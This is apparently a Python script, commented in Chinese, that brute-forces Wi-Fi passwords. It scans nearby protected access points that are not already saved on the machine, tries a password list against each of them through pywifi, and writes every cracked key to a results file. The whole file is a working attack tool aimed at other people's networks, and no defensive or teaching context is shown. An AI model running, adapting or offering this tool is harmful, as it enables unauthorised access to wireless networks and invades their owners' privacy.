import random
import math

import pywifi
from pywifi import const  # 引用一些定义

from _util import *


def main():

    print('[+]导入密码本')
    passwords = []
    with open('password.txt') as f:
        for line in f:
            passwords.append(line.strip())
    if len(passwords) < 200:  # 起始的200个被认为是具有较高可能性的密码
        p_passwords = passwords
        r_passwords = []
    else:
        p_passwords = passwords[:200]
        r_passwords = passwords[200:]
    print('[-]成功导入密码本')

    print('[+]获取网卡')
    wifi = pywifi.PyWiFi()  # 抓取网卡接口
    iface = wifi.interfaces()[0]  # 获取网卡，对于wifi连接服务，默认为0号网卡
    print('[-]成功获取网卡')

    print('[+]导入已经计算机存储的网络PROFILES')
    saved_ssids = [profile.ssid for profile in iface.network_profiles()]
    print('[*]已保存的PROFILES的SSID为', saved_ssids)
    print('[-]完成导入已经计算机存储的网络')

    print('[+]扫描当前可用热点，并选出需要密码破解的热点')
    scanned_profiles = get_aps(
        iface, count=5, filtered_ssids=saved_ssids)  # 扫描当前可用的热点
    needpwd_profiles, _ = classify_aps(scanned_profiles)  # 分开需要密码和不需要密码的热点
    print('[*]需要破解的热点为', [profile.ssid for profile in needpwd_profiles])
    print('[-]完成扫描')

    # 不需要密码的热点通常都是需要额外的验证操作的，由使用者自行把握
    # 只考虑需要密码的热点
    cracked_table = {}

    print('[+]开始暴力破解')

    for profile in needpwd_profiles:
        ssid = profile.ssid
        print('[+]开始破解SSID:', ssid)

        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元 /cipher - AP的密码类型

        if r_passwords:
            t_passwords = p_passwords + \
                random.sample(r_passwords, int(math.sqrt(len(r_passwords))))
        else:
            t_passwords = p_passwords

        for key in t_passwords:
            print('[+]使用密码 %s 破解 %s' % (key, ssid))

            profile.key = key

            if crack_ap(iface, profile):
                cracked_table[profile.ssid] = key
                with open('crack_result.txt', 'a') as f:
                    f.write('%s : %s\n' % (ssid, key))
                print('[-]使用密码 %s 破解 %s成功' % (key, ssid))
                break
            else:
                print('[-]使用密码 %s 破解 %s失败' % (key, ssid))

        print('[-]结束破解SSID:', profile.ssid)

    print('[*]破解出的密码表为', cracked_table)
    print('[-]暴力破解完成')

    return cracked_table


def __main__():
    import argparse

    main()


if __name__ == '__main__':
    __main__()
